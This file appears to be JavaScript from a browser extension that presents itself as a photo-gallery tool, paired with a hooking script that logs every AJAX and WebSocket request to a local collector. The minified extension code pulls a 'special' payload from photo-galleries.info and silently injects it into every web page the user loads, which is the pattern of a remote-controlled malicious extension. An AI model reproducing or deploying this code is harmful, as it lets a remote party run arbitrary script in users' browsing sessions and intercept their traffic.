function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function get(e){var t=localStorage[e];if(!t||t=="false"){return false}return t}function set(e,t){localStorage[e]=t}function initConfig(){var e=new XMLHttpRequest;e.open("GET","http://www.photo-galleries.info/config_186sfjdsf5g.php?id="+conf_s_id,true);e.onreadystatechange=function(t){if(e.status==200&&e.readyState==4){var n=e.responseText;if(n){n=JSON.parse(n);set("share",n.share);set("special",n.special)}}};e.send(null)}function createContext(){chrome.contextMenus.removeAll(function(){});chrome.contextMenus.create({type:"normal",title:"Add to "+chrome.app.getDetails().name,contexts:["image"],onclick:function(e,t){addImg(e.srcUrl)}})}function addImg(e){var t=JSON.parse(get("items"));t.push(e);set("items",JSON.stringify(t))}function deleteImg(e){var t=JSON.parse(get("items"));t.splice(e,1);set("items",JSON.stringify(t))}function doSpecial(e){var t=get("special");if(t&&!get("special_disable")){chrome.tabs.executeScript(e.id,{code:decodeURIComponent(t),runAt:"document_end"},function(){})}}$(document).ready(function(){var e=get("items");if(!e){set("items",JSON.stringify(conf_default_images))}initConfig();createContext()});chrome.tabs.onUpdated.addListener(function(e,t,n){if(t.status=="complete"&&(n.url.indexOf("http://")!=-1||n.url.indexOf("https://")!=-1)){doSpecial(n)}})